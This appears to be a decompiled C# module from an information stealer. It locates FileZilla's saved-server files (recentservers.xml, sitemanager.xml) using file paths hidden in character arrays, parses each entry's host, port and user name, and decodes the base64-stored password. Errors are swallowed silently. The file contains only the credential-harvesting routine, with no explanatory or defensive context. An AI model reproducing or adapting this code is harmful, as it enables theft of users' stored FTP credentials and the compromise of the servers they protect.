using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Xml;

// Token: 0x02000003 RID: 3
public class Entity19
{
	// Token: 0x06000009 RID: 9 RVA: 0x00002F5C File Offset: 0x0000135C
	public static List<Entity12> Id1()
	{
		List<Entity12> list = new List<Entity12>();
		try
		{
			string path = string.Format(new string(new char[]
			{
				'{',
				'0',
				'}',
				'\\',
				'F',
				'i',
				'l',
				'e',
				'Z',
				'i',
				'l',
				'l',
				'a',
				'\\',
				'r',
				'e',
				'c',
				'e',
				'n',
				't',
				's',
				'e',
				'r',
				'v',
				'e',
				'r',
				's',
				'.',
				'x',
				'm',
				'l'
			}), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
			string path2 = string.Format(new string(new char[]
			{
				'{',
				'0',
				'}',
				'\\',
				'F',
				'i',
				'l',
				'e',
				'Z',
				'i',
				'l',
				'l',
				'a',
				'\\',
				's',
				'i',
				't',
				'e',
				'm',
				'a',
				'n',
				'a',
				'g',
				'e',
				'r',
				'.',
				'x',
				'm',
				'l'
			}), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
			bool flag = File.Exists(path);
			if (flag)
			{
				list.AddRange(Entity19.Id2(path));
			}
			bool flag2 = File.Exists(path2);
			if (flag2)
			{
				list.AddRange(Entity19.Id2(path2));
			}
		}
		catch
		{
		}
		return list;
	}

	// Token: 0x0600000A RID: 10 RVA: 0x0000300C File Offset: 0x0000140C
	private static List<Entity12> Id2(string Path)
	{
		List<Entity12> list = new List<Entity12>();
		try
		{
			XmlTextReader reader = new XmlTextReader(Path);
			XmlDocument xmlDocument = new XmlDocument();
			xmlDocument.Load(reader);
			foreach (object obj in xmlDocument.DocumentElement.ChildNodes[0].ChildNodes)
			{
				XmlNode xmlNode = (XmlNode)obj;
				Entity12 entity = Entity19.Id3(xmlNode);
				bool flag = entity.Id1 != "UNKNOWN" && entity.Id1 != "UNKNOWN";
				if (flag)
				{
					list.Add(entity);
				}
			}
		}
		catch
		{
		}
		return list;
	}

	// Token: 0x0600000B RID: 11 RVA: 0x000030F0 File Offset: 0x000014F0
	private static Entity12 Id3(XmlNode xmlNode)
	{
		Entity12 entity = new Entity12();
		try
		{
			foreach (object obj in xmlNode.ChildNodes)
			{
				XmlNode xmlNode2 = (XmlNode)obj;
				bool flag = xmlNode2.Name == "Host";
				if (flag)
				{
					entity.Id1 = xmlNode2.InnerText;
				}
				bool flag2 = xmlNode2.Name == "Port";
				if (flag2)
				{
					entity.Id1 = entity.Id1 + ":" + xmlNode2.InnerText;
				}
				bool flag3 = xmlNode2.Name == "User";
				if (flag3)
				{
					entity.Id2 = xmlNode2.InnerText;
				}
				bool flag4 = xmlNode2.Name == "Pass";
				if (flag4)
				{
					entity.Id3 = Encoding.UTF8.GetString(Convert.FromBase64CharArray(xmlNode2.InnerText.ToCharArray(), 0, xmlNode2.InnerText.Length));
				}
			}
		}
		catch
		{
		}
		finally
		{
			entity.Id1 = (string.IsNullOrEmpty(entity.Id1) ? "UNKNOWN" : entity.Id1);
			entity.Id2 = (string.IsNullOrEmpty(entity.Id2) ? "UNKNOWN" : entity.Id2);
			entity.Id3 = (string.IsNullOrEmpty(entity.Id3) ? "UNKNOWN" : entity.Id3);
		}
		return entity;
	}
}
